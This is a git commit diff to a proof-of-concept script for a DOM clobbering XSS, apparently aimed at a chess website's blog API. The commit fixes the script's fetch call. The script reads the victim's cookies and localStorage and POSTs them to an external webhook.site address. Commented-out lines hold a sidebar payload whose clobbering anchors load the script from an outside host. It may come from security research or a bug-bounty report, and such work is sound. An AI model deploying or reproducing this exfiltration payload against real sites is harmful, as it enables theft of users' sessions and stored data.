5c076b649f9dbfa2119ed4376b35554f917e6993
Hussein Mahmoud <housien.a.khalek19@gmail.com>
2026-05-01 15:07:01 +0300

    Refactor fetch call for exfiltrating data

--- POC.js
+++ POC.js
@@ -9,14 +9,13 @@ alert("DOM Clobbering XSS by Hussein on: " + document.domain);
 
 var userCookies = document.cookie;
 var userStorage = JSON.stringify(localStorage);
-
 var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
-fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/"), {
-    method: "POST",    
-    mode: "no-cors",     
-    body: exfilData       
-}
+fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/", {
+    method: "POST",
+    mode: "no-cors",
+    body: exfilData
+});
 // const apiUrl = 'https://api.chess.com/rpc/chesscom.user_profile.v1.UserProfileService/SetBlogDetails';
 // const maliciousSidebar = "<p>Hey, check out this cool trick! <a id=\"__tudeConfig\"></a><a id=\"__tudeConfig\" href=\"https://hussein-e4.github.io/POC.js\" name=\"endpoint\"></a></p>";
 // const requestBody = {
